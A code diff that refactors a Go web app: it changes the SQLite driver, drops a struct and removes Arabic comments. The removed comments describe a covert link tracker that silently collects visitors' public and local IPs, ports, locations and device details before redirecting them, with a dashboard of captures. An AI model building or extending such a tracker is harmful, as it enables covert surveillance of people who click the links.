@@ -10,7 +10,7 @@ import (
 	"strings"
 	"time"
 
-	_ "github.com/mattn/go-sqlite3"
+	_ "modernc.org/sqlite"
 )
 
 var db *sql.DB
@@ -26,26 +26,18 @@ type Capture struct {
 	CreatedAt  string
 }
 
-type Link struct {
-	ID        int
-	Code      string
-	TargetURL string
-	CreatedAt string
-}
-
 func initDB() {
 	var err error
-	db, err = sql.Open("sqlite3", "./long_term_tracker.db")
+	// استخدام محرك sqlite النقي الخاص بـ modernc
+	db, err = sql.Open("sqlite", "./long_term_tracker.db")
 	if err != nil {
 		panic(err)
 	}
 
-	// إعدادات إدارة الاتصالات طويلة الأجل لمنع استنزاف الموارد
 	db.SetMaxOpenConns(25)
 	db.SetMaxIdleConns(25)
 	db.SetConnMaxLifetime(5 * time.Minute)
 
-	// إنشاء الجداول مع الفهارس (Indexes) لتسريع البحث على المدى الطويل
 	createTablesSQL := `
 	CREATE TABLE IF NOT EXISTS links (
 		id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -143,11 +135,9 @@ func getISPAndLocation(ip string, ua string) string {
 	return "Algeria (Network Trace)"
 }
 
-// معالج لوحة التحكم الرئيسية والروابط
 func mainHandler(w http.ResponseWriter, r *http.Request) {
 	code := r.URL.Query().Get("r")
 
-	// إذا كان الطلب يتضمن كود تتبع (زيارة الرابط المستهدف)
 	if code != "" {
 		var targetURL string
 		err := db.QueryRow("SELECT target_url FROM links WHERE code = ?", code).Scan(&targetURL)
@@ -194,7 +184,6 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
-		// صفحة استخراج البيانات الصامتة في الخلفية ثم التوجيه السريع
 		htmlContent := fmt.Sprintf(`<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -256,7 +245,6 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// معالجة توليد رابط جديد من لوحة التحكم
 	if r.Method == http.MethodPost {
 		r.ParseForm()
 		targetURL := r.FormValue("target_url")
@@ -271,7 +259,6 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// جلب السجلات لعرضها في لوحة التحكم
 	rows, _ := db.Query("SELECT id, code, public_ip, local_ip, port, location, device_info, created_at FROM captures ORDER BY id DESC LIMIT 50")
 	defer rows.Close()
 
@@ -282,7 +269,6 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		captures = append(captures, c)
 	}
 
-	// واجهة لوحة التحكم
 	tmpl := `<!DOCTYPE html>
 <html lang="en">
 <head>
